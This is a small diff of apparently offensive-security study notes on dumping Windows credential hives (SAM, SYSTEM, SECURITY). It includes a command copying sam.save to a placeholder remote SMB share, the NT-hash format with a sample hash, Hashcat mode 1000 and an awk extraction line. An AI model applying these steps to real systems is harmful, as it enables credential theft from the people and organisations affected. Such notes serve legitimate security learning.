@@ -29,7 +29,8 @@ move sam.save \\<hoost ip>\SHARENAME
 			-> `username:RID:LM_hash:NT_hash:::` format eg, `bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::`
 			-> focus on the NT_hash 
 			-> Hashcat mode 1000
-			-> `awk -F: ''`
+			-> `awk -F: '{print $4}' nthashes` to get only the last field 
 
 	- `C:\Windows\System32\config\SYSTEM`
+	
 	- `C:\Windows\System32\config\SECURITY `
